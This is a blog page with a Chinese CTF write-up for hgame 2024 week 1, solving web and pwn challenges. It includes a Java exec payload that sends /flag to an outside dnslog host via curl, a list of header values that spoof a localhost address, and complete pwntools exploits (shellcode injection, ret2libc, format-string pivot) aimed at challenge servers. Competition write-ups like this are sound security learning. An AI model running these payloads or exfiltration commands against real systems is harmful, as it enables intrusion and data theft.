<!DOCTYPE html><script type="text/javascript" src="/js/crash_cheat.js"></script><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>hgame2024_week1 WP | 晨曦的个人小站</title><meta name="author" content="晨曦"><meta name="copyright" content="晨曦"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="hgame2024_week1 的 WP">
<meta property="og:type" content="article">
<meta property="og:title" content="hgame2024_week1 WP">
<meta property="og:url" content="http://example.com/hgame2024_week1/index.html">
<meta property="og:site_name" content="晨曦的个人小站">
<meta property="og:description" content="hgame2024_week1 的 WP">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/hgame2024_week1/%E5%B0%81%E9%9D%A2.jpg">
<meta property="article:published_time" content="2024-02-06T14:32:57.000Z">
<meta property="article:modified_time" content="2024-02-08T03:32:40.898Z">
<meta property="article:author" content="晨曦">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="write up">
<meta property="article:tag" content="WEB">
<meta property="article:tag" content="MISC">
<meta property="article:tag" content="CRYPTO">
<meta property="article:tag" content="PWN">
<meta property="article:tag" content="REVERSE">
<meta property="article:tag" content="hgame">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/hgame2024_week1/%E5%B0%81%E9%9D%A2.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/hgame2024_week1/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":300},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  }
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'hgame2024_week1 WP',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-02-08 11:32:40'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
      const link = document.createElement('link')
      link.rel = 'stylesheet'
      link.href = url
      if (id) link.id = id
      link.onerror = reject
      link.onload = link.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        link.onload = link.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(link)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="/css/custom.css"><link rel="stylesheet" href="/css/nav.css"><link rel="stylesheet" href="/css/bj.css"><link rel="stylesheet" href="/css/cat.css"><div id="myscoll"></div><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/chenxi.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">14</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">21</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">12</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/./hgame2024_week1/%E5%B0%81%E9%9D%A2.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="晨曦的个人小站"><span class="site-name">晨曦的个人小站</span></a></span><div id="menus"></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div><div id="nav-right"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i></a></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">hgame2024_week1 WP</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-02-06T14:32:57.000Z" title="发表于 2024-02-06 22:32:57">2024-02-06</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-02-08T03:32:40.898Z" title="更新于 2024-02-08 11:32:40">2024-02-08</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">4.4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>22分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="hgame2024_week1 WP"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="2048-16"><a href="#2048-16" class="headerlink" title="2048*16"></a>2048*16</h2><p>这道题是猜的，没有把js代码看明白</p>
<p>js代码搜<code>won</code>，可以看到这里</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./hgame2024_week1/w_1_1.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">V+g5LpoEej/fy0nPNivz9SswHIhGaDOmU8CuXb72dB1xYMrZFRAl=QcTq6JkWK4t3</span><br></pre></td></tr></table></figure>

<p>这个字符串的长度是65，且没有重复的字符，这里我猜一手是base64码表。</p>
<p>根据这个码表，从flag头找flag。</p>
<p>先是用<code>hgame</code>头来找，取出<code>hga</code>用变表的base64加密得到<code>hoD8</code>，然后全局搜，发现没有。</p>
<p>接着尝试<code>flag</code>头，用<code>fla</code>进行base64加密得到<code>I7R8</code>，全局搜得到以下结果</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./hgame2024_week1/w_1_2.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">I7R8ITMCnzbCn5eFIC=6yliXfzN=I5NMnz0XIC==yzycysi70ci7y7iK</span><br></pre></td></tr></table></figure>

<p>把这串字符串用变表的base64解码，即可得到flag</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./hgame2024_week1/w_1_3.png"></p>
<h2 id="Bypass-it"><a href="#Bypass-it" class="headerlink" title="Bypass it"></a>Bypass it</h2><p>这道题注册一个账号登录成功即可。</p>
<p>进入题目来到<code>login.html</code>，先禁用js，点击注册，来到<code>register_page.php</code>页面。</p>
<p>之后打开js，随便注册一个账号。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./hgame2024_week1/w_2_1.png"></p>
<p>用刚刚注册的账号登录成功后，点击<code>[~Click here~]</code>即可得到flag。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./hgame2024_week1/w_2_2.png"></p>
<h2 id="jhat"><a href="#jhat" class="headerlink" title="jhat"></a>jhat</h2><p>参考这篇文章：<a target="_blank" rel="noopener" href="https://chenxuuu.github.io/wooyun_articles/drops/OQL(%E5%AF%B9%E8%B1%A1%E6%9F%A5%E8%AF%A2%E8%AF%AD%E8%A8%80)%E5%9C%A8%E4%BA%A7%E5%93%81%E5%AE%9E%E7%8E%B0%E4%B8%AD%E9%80%A0%E6%88%90%E7%9A%84RCE(Object%20Injection).html">OQL(对象查询语言)在产品实现中造成的RCE(Object Injection)</a></p>
<p>在<code>[Execute Object Query Language (OQL) query]</code>可以直接执行java代码，通过dnslog外带即可得到flag。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./hgame2024_week1/w_3_1.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java.lang.Runtime.getRuntime().exec(&quot;bashKKK-cKKK&#123;echo,Y3VybCBgY2F0IC9mbGFnYC5kZjE1YXUuZG5zbG9nLmNu&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;.split(&quot;KKK&quot;))</span><br></pre></td></tr></table></figure>

<p>这里利用<code>split</code>将字符串变成字符数组，<code>echo</code>后边的base64编码里的内容是我们要执行的命令，这里我执行了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl `cat /flag`.df15au.dnslog.cn</span><br></pre></td></tr></table></figure>

<p>之后在<code>dnslog</code>可以查看到flag。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./hgame2024_week1/w_3_2.png"></p>
<p>补上花括号即可。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hgame&#123;a90f6f3fde61e38f2c21b82de9c04e5702f1eaad&#125;</span><br></pre></td></tr></table></figure>

<h2 id="ezHTTP"><a href="#ezHTTP" class="headerlink" title="ezHTTP"></a>ezHTTP</h2><p>考察的是http头，按照要求添加对应的http头即可。</p>
<p>这里需要注意的是，伪造本地并不是只有<code>X-Forwarded-For</code>，下面这些都可以</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">X-Forwarded-For:127.0.0.1</span><br><span class="line">X-Forwarded:127.0.0.1</span><br><span class="line">Forwarded-For:127.0.0.1</span><br><span class="line">Forwarded:127.0.0.1</span><br><span class="line">X-Forwarded-Host:127.0.0.1</span><br><span class="line">X-remote-IP:127.0.0.1</span><br><span class="line">X-remote-addr:127.0.0.1</span><br><span class="line">True-Client-IP:127.0.0.1</span><br><span class="line">X-Client-IP:127.0.0.1</span><br><span class="line">Client-IP:127.0.0.1</span><br><span class="line">X-Real-IP:127.0.0.1</span><br><span class="line">Ali-CDN-Real-IP:127.0.0.1</span><br><span class="line">Cdn-Src-Ip:127.0.0.1</span><br><span class="line">Cdn-Real-Ip:127.0.0.1</span><br><span class="line">CF-Connecting-IP:127.0.0.1</span><br><span class="line">X-Cluster-Client-IP:127.0.0.1</span><br><span class="line">WL-Proxy-Client-IP:127.0.0.1</span><br><span class="line">Proxy-Client-IP:127.0.0.1</span><br><span class="line">Fastly-Client-Ip:127.0.0.1</span><br><span class="line">True-Client-Ip:127.0.0.1</span><br></pre></td></tr></table></figure>

<p>这个题就用了<code>X-Real-IP</code>来伪造本地。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./hgame2024_week1/w_4_1.png"></p>
<p>最后在返回的头中得到一串<code>jwt</code>，用 <a target="_blank" rel="noopener" href="https://jwt.io/">jwt.io</a> 解码即可得到flag。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./hgame2024_week1/w_4_2.png"></p>
<h2 id="Select-Courses"><a href="#Select-Courses" class="headerlink" title="Select Courses"></a>Select Courses</h2><p>莫名奇妙就出了，很怪。</p>
<p>抓包，抓一个选课的包，然后去爆破重复发，等等就有flag了。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./hgame2024_week1/w_5_1.png"></p>
<p>爆破设置选择数值，爆破位置选择<code>User-Agent</code>的任意一个字符。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./hgame2024_week1/w_5_2.png"></p>
<p><code>id</code>从<code>1-5</code>都发一次，爆破结束后访问<code>/api/ok</code>就能得到flag了。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./hgame2024_week1/w_5_3.png"></p>
<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="EzSignIn"><a href="#EzSignIn" class="headerlink" title="EzSignIn"></a>EzSignIn</h2><p>nc即可得到flag。</p>
<h2 id="ezshellcode"><a href="#ezshellcode" class="headerlink" title="ezshellcode"></a>ezshellcode</h2><p>先ida分析</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./hgame2024_week1/p_2_1.png"></p>
<p>这里要求输入的数字要小于10，注意以下这里的<code>v4</code>是有符号的int。</p>
<p>查看<code>myread</code>函数</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./hgame2024_week1/p_2_2.png"></p>
<p>注意以下形参的<code>a2</code>是无符号的int，也就是传进来的<code>v4</code>会转成无符号的<code>a1</code>，因此在这里<code>v4</code>传入一个负数绕过主函数的判断。</p>
<p>接着是对shellcode的检查要求是字母+数字，去网上抄一条就行了。</p>
<p>参考链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/mcmuyanga/article/details/114828207">[BUUCTF]PWN——mrctf2020_shellcode_revenge（可见字符shellcode）</a></p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">p=remote(<span class="string">&quot;47.100.137.175&quot;</span>,<span class="number">31592</span>)</span><br><span class="line"></span><br><span class="line">shellcode=<span class="string">&quot;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;input the length of your shellcode:&#x27;</span>,<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;input your shellcode:&quot;</span>,shellcode)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./hgame2024_week1/p_2_3.png"></p>
<h2 id="Elden-Random-Challenge"><a href="#Elden-Random-Challenge" class="headerlink" title="Elden Random Challenge"></a>Elden Random Challenge</h2><p>ida分析</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./hgame2024_week1/p_3_1.png"></p>
<p><code>seed</code>取的是当前时间，之后是99次的随机数判断，然后就是<code>myread</code>函数。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./hgame2024_week1/p_3_2.png"></p>
<p><code>myread</code>函数存在栈溢出，没有后门，用libc打。</p>
<p>先走到<code>myread</code>，第一次溢出泄露出<code>puts</code>的地址。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./vuln&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;47.100.137.175&#x27;</span>, <span class="number">32019</span>)</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x401423</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">myread = <span class="number">0x40125D</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">name = <span class="string">b&#x27;a&#x27;</span>*<span class="number">13</span></span><br><span class="line">libc.srand(<span class="built_in">int</span>(time.time()))</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;thy name.\n&#x27;</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">99</span>):</span><br><span class="line">    v6 = (libc.rand() % <span class="number">100</span>) + <span class="number">1</span></span><br><span class="line">    p.sendafter(<span class="string">b&#x27;the number:\n&#x27;</span>,p32(v6))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 泄露地址</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">48</span>+<span class="number">8</span>)+p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(myread)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;thy brilliant mind.\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">puts_addr = p.recv(<span class="number">6</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="number">1</span>,puts_addr)</span><br><span class="line">puts_addr = puts_addr.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="number">2</span>,puts_addr)</span><br><span class="line">puts_addr = u64(puts_addr)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="number">3</span>,puts_addr)</span><br><span class="line"><span class="built_in">print</span>(<span class="number">4</span>,<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x7f2160359420</span></span><br></pre></td></tr></table></figure>

<p>泄露出<code>puts</code>的地址后3位为<code>420</code>。</p>
<p>通过 <a target="_blank" rel="noopener" href="https://libc.blukat.me/">libc database search</a> 查找<code>puts</code>、  <code>system</code> 和 <code>/bin/sh</code> 的地址。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./hgame2024_week1/p_3_3.png"></p>
<p>根据<code>puts</code>的地址算出<code>libc</code>的基地址，在第二次栈溢出时<code>getshell</code>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./vuln&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;47.100.137.175&#x27;</span>, <span class="number">30915</span>)</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x401423</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">main_addr = <span class="number">0x40125D</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">name = <span class="string">b&#x27;a&#x27;</span>*<span class="number">13</span></span><br><span class="line">libc.srand(<span class="built_in">int</span>(time.time()))</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;thy name.\n&#x27;</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">99</span>):</span><br><span class="line">    v6 = (libc.rand() % <span class="number">100</span>) + <span class="number">1</span></span><br><span class="line">    p.sendafter(<span class="string">b&#x27;the number:\n&#x27;</span>,p32(v6))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">48</span>+<span class="number">8</span>)+p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line"><span class="comment"># 泄露地址</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;thy brilliant mind.\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(0,p.recvline())  #p.recvuntil(&#x27;\x0a&#x27;)</span></span><br><span class="line">puts_addr = p.recv(<span class="number">6</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="number">1</span>,puts_addr)</span><br><span class="line">puts_addr = puts_addr.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="number">2</span>,puts_addr)</span><br><span class="line">puts_addr = u64(puts_addr)</span><br><span class="line"><span class="comment">#puts_addr = u64(p.recv(6).ljust(8, b&#x27;\x00&#x27;))</span></span><br><span class="line"><span class="built_in">print</span>(<span class="number">3</span>,puts_addr)</span><br><span class="line"><span class="built_in">print</span>(<span class="number">4</span>,<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># getshell</span></span><br><span class="line">sys_offset = <span class="number">0x052290</span></span><br><span class="line">puts_offset = <span class="number">0x084420</span></span><br><span class="line">sh_offset = <span class="number">0x1b45bd</span></span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - puts_offset</span><br><span class="line">binsh = libc_base + sh_offset</span><br><span class="line">system = libc_base + sys_offset</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">48</span>+<span class="number">8</span>)</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(binsh)</span><br><span class="line">payload += p64(system)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./hgame2024_week1/p_3_4.png"></p>
<h2 id="ezfmt-string"><a href="#ezfmt-string" class="headerlink" title="ezfmt string"></a>ezfmt string</h2><p>只有一次的格式化字符串</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./hgame2024_week1/p_4_1.png"></p>
<p><code>vuln</code>函数存在格式化字符串，存在后门函数。</p>
<p>格式化字符串能够修改任意地址，这里我用了栈迁移的方法实现对后门函数的调用。</p>
<p>参考链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/Kata_Jhin/article/details/130678623">栈迁移（leave ret）（更适合pwn宝宝体质的栈迁移~）</a></p>
<p>经过测试，old ebp在第18个位置，修改这个地址，然后在栈里面写入<code>sys</code>的地址。</p>
<p>exp需要多跑几次，概率能通</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./vuln&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;47.100.137.175&quot;</span>,<span class="number">31349</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;%72c%18$hhnaaaaa&#x27;</span>+p64(<span class="number">0x40123D</span>)*<span class="number">6</span></span><br><span class="line">p.sendafter(<span class="string">b&#x27;M3?\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./hgame2024_week1/p_4_2.png"></p>
